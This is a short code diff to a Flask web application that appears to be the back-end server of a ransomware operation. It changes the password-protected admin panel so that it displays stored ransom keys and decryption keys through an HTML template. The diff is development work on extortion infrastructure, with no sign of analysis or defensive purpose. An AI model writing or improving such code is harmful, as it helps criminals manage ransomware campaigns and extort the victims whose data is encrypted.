@@ -5,6 +5,7 @@ from flask import Flask,request,render_template,redirect
 import base64
 import random
 import hashlib
+import re
 
 global ransom_keys
 ransom_keys = {}
@@ -102,6 +103,8 @@ def delete_key(key):
 
 @app.route("/admin/",methods=["POST","GET"])
 def admin_panel():
+    global ransom_keys
+    global decryption_keys
     global ALLOWED_USERS
     if request.method=="GET":
         return render_template("login.html")
@@ -110,7 +113,9 @@ def admin_panel():
         password = request.values.get("password")
         if username in ALLOWED_USERS.keys():
             if ALLOWED_USERS[username]==hashpass(password,username):
-                return "\n".join([f"<p>{i}</p>" for i in ransom_keys.keys()])
+                ransom_keys_return = {i:[str(ransom_keys[i][0]).replace("\\n","<br/>"),str(ransom_keys[i][1]).replace("\\n","<br/>")] for i in ransom_keys.keys()}
+                return render_template("admin.html",decryption_keys=decryption_keys,ransom_keys=ransom_keys_return)
+                #return "\n".join([f"<p>{i}</p>" for i in ransom_keys.keys()])
         return render_template("disallow.html")
 
 
